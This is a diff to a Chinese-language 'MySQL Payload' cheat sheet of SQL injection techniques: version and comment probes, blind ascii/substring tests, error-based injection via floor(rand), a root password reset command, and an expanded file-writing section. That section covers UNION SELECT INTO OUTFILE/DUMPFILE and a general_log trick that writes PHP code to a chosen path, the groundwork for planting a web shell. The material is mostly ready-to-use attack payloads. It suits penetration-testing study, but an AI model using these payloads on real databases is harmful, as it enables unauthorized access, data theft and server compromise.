@@ -1,6 +1,8 @@
 MySQL Payload
-=====================================
+========================================
 
+常见Payload
+----------------------------------------
 - Version 
     - ``SELECT @@version``
 - Comment 
@@ -38,9 +40,35 @@ MySQL Payload
     - ``ascii(substring(str,pos,length)) & 32 = 1``
 - Error Based
     - ``select count(*),(floor(rand(0)*2))x from information_schema.tables group by x;``
-- Write File
-    - ``union select 1,1,1 into outfile '/tmp/demo.txt'``
-    - ``union select 1,1,1 into dumpfile '/tmp/demo.txt'``
-    - dumpfile和outfile不同在于，outfile会在行末端写入新行，会转义换行符，如果写入二进制文件，很可能被这种特性破坏
 - Change Password
     - ``mysql -uroot -e "use mysql;UPDATE user SET password=PASSWORD('newpassword') WHERE user='root';FLUSH PRIVILEGES;"``
+
+写文件
+----------------------------------------
+
+写文件前提
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+- root 权限
+- 知晓文件绝对路径
+- 写入的路径存在写入权限
+- secure_file_priv 允许向对应位置写入
+
+基于 into 写文件
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+.. code-block:: sql
+
+    union select 1,1,1 into outfile '/tmp/demo.txt'
+    union select 1,1,1 into dumpfile '/tmp/demo.txt'
+
+dumpfile和outfile不同在于，outfile会在行末端写入新行，会转义换行符，如果写入二进制文件，很可能被这种特性破坏
+
+基于 log 写文件
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+.. code-block:: sql
+
+    show variables like '%general%';
+    set global general_log = on;
+    set global general_log_file = '/path/to/file';
+    select '<?php var_dump("test");?>';
+    set global general_log_file = '/original/path';
+    set global general_log = off;
